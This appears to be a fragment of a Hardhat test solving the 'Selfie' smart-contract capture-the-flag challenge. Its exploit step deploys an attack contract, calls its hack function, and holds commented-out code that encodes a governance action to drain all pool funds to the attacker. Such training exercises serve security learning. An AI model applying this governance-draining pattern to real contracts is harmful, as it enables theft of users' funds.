...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const Attack3 = await ethers.getContractFactory('Attack3', attacker)
        this.att = await Attack3.deploy(this.token.address, this.pool.address, this.governance.address)
        await this.att.deployed()

        await this.att.hack(TOKENS_IN_POOL)

        // data
        // const interface = new ethers.utils.Interface([
        //     "function drainAllFunds(address) external" 
        // ])
        // const calldata = interface.encodeFunctionData("drainAllFunds", [attacker.address])
        // const actionId = await this.governance.queueAction(this.pool.address, calldata, 0)
